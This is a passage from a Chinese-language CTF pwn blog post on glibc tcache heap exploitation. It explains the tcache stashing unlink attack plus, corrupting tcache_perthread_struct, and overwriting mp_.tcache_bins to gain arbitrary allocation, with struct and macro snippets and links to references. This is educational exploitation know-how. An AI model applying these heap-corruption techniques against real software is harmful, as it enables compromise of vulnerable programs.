+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/e42a4466e43ee.png" alt="1651065435730.png" loading="lazy"></figure>
+<h4 id="tcache-stashing-unlink-attack-plus">tcache stashing unlink attack plus</h4>
+<p>实现第二个效果的方法和之前差不多，首先将tcache摆好5个chunk，然后再放两个chunk进对于的smallbin</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/2b97ef9fabd67.png" alt="1651065541052.png" loading="lazy"></figure>
+<p>我们将第二个small chunk的bk改为目标位置-0x10，然后保证目标地址+0x8是个可写的地址（准确的说是[目标地址+0x8]+0x10因为会执行<code>bck-&gt;fd = bin</code>，如果bck-&gt;fd不可写的话会报错）</p>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/aaa5690eb0913.png" alt="1651065886899.png" loading="lazy"></figure>
+<p>在使用calloc请求了一个small chunk之后，会先将你伪造好了bk的那个chunk放进tcache，但此时tcache对应的size还可以装一个，所以还会继续stash，此时就会将目标位置放到tcache entries的头部。</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/27/3a4d0df25d697.png" alt="1651066076824.png" loading="lazy"></figure>
+<p>接下来，使用malloc去拿那个chunk就好了，因为直接有合适的size可以拿，不会进入到smallbin的循环中，就不会异常退出。（在house of pig中，使用<code>_IO_str_overflow</code>来调用malloc）</p>
+<h2 id="attack-tcache_perthread_struct">Attack tcache_perthread_struct</h2>
+<p>启用tcache bin的程序，在堆被初始化的时候便会申请出一个chunk，存tcache的各种信息，这就是<code>tcache_perthread_struct</code>。它存放了每个size的tcache的<code>entries</code>指针，以及对应bin中的空闲chunk个数。</p>
+<ul>
+<li>通过攻击entries可以达到任意地址分配</li>
+<li>攻击counts可以改变空闲chunk的个数（比如说在限制chunk个数的情况下放入unsorted bin实现leak或其他trick）</li>
+</ul>
+<p>该方法往往会结合打<code>mp_.tcache_bins</code>，算好偏移，将<code>entries</code>和<code>counts</code>数组延续到可控区域来实现任意申请。</p>
+<h2 id="attack-mp_tcache_bins">Attack mp_.tcache_bins</h2>
+<p>在学习这种攻击手法之前，先来看看tcache的结构，</p>
+<pre><code class="language-c">typedef struct tcache_perthread_struct {
+    uint16_t counts[TCACHE_MAX_BINS];
+    tcache_entry* entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+</code></pre>
+<p>可以看到这里<code>TCACHE_MAX_BINS</code>是常量，不过最终在<code>__libc_malloc</code>内部，使用的还是<code>mp_.tcache_bins</code>，所以不必担心无法劫持。</p>
+<p>在可以申请到大chunk的时候，通常可以使用largebin attack去打<code>mp_.tcache_bins</code>，让更大的chunk能进入到tcache bin中（这一点和打global_max_fast很相似）。</p>
+<p>如果<code>counts[idx]&gt;0</code>，那么就会从对应<code>entries[idx]</code>拿chunk，我们前面已经攻击了<code>mp_.tcache_bins</code>，那么这个数组其实就相当于能延续相当长一段内存空间，我们在可控内存布置好对应的entries和counts（也就是伪造好一个<code>tcache_perthread_struct</code>中entries和counts对应的下标处），就能达到任意内存申请。</p>
+<p>这里给出偏移的计算方式</p>
+<pre><code class="language-c"># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
+</code></pre>
+<p>（在x64中<code>MINSIZE</code>是<code>0x20</code>，<code>MALLOC_ALIGNMENT</code>是<code>2*SIZE_SZ</code>，也就是<code>0x10</code>）</p>
+<p>例题参考：<a href="https://www.anquanke.com/post/id/235821#h3-8">VNCTF-2022 LittleRedFlower</a></p>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/tcache/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/tcache/</a></p>
+<p><a href="https://www.anquanke.com/post/id/198173">https://www.anquanke.com/post/id/198173</a></p>
+<p><a href="https://www.anquanke.com/post/id/235821">https://www.anquanke.com/post/id/235821</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#tcache-bin%E6%A6%82%E8%BF%B0">tcache bin概述</a>
+<ul>
+<li><a href="#libc226">libc2.26</a></li>
+<li><a href="#libc229">libc2.29+</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">攻击手法</a>
+<ul>
+<li><a href="#tcache-poisoning">tcache poisoning</a>
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#tcache-poisoning-at-234">tcache poisoning at 2.34+</a></li>
+<li><a href="#%E4%BE%8B%E9%A2%98">例题</a>
+<ul>
+<li><a href="#hitcon-2018-baby_tcache">HITCON 2018 baby_tcache</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#double-free">double free</a>
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-2">介绍</a>
+<ul>
+<li><a href="#%E5%9C%A8libc226%E4%B8%8B">在libc2.26下：</a></li>
+<li><a href="#%E5%9C%A8libc229%E4%B8%8B">在libc2.29+下：</a></li>
+<li><a href="#tcache-stash-on-fastbin">Tcache Stash on Fastbin</a></li>
+<li><a href="#bypass-double-free-check">bypass double free check</a>
+<ul>
+<li><a href="#%E5%8A%AB%E6%8C%81key">劫持key</a>
+<ul>
+<li><a href="#demo01c">demo01.c</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8A%AB%E6%8C%81chunk-size">劫持chunk size</a>
+<ul>
+<li><a href="#demo02c">demo02.c</a></li>
+</ul>
+</li>
+<li><a href="#house-of-botcake">house of botcake</a>
+<ul>
+<li><a href="#demo03c">demo03.c</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#tcache-stashing-unlink-attack">tcache stashing unlink attack</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E6%95%88%E6%9E%9C">效果</a></li>
+<li><a href="#%E4%BE%8B%E5%AD%90">例子</a>
+<ul>
+<li><a href="#tcache-stashing-unlink-attack-2">tcache stashing unlink attack</a></li>
+<li><a href="#tcache-stashing-unlink-attack-plus">tcache stashing unlink attack plus</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#attack-tcache_perthread_struct">Attack tcache_perthread_struct</a></li>
+<li><a href="#attack-mp_tcache_bins">Attack mp_.tcache_bins</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">参考文章</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/IO_FILE总结篇/">
+              <h3 class="post-title">
+                IO_FILE Summary
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
